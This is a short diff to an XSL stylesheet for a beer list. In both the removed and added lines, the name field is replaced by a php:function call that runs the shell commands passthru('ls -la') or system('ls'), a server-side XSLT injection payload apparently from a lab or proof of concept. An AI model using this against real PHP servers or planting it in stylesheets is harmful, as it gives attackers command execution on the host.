@@ -3,7 +3,7 @@
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
 <xsl:for-each select="beers/beer">
   <div style="background-color:teal;color:white;padding:4px">
-    <span style="font-weight:bold"><xsl:value-of select="php:function(‘passthru’,’ls -la’)"/> - </span>
+    <span style="font-weight:bold"><xsl:value-of select="php:function(‘system’,’ls’)"/> - </span>
     <xsl:value-of select="price"/>
     </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
